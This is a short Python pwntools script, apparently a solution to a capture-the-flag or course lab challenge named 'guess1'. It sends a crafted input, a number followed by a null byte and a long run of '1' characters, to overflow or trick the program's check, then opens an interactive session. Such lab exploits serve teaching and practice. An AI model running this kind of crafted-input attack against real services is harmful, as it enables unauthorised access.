from pwn import *

#conn = remote('aup.zoolab.org', 38156)
conn = process('../src/guess1')

r = conn.recv()

ans = '825307441\0' + '1'*100
conn.sendline(ans)

conn.interactive()
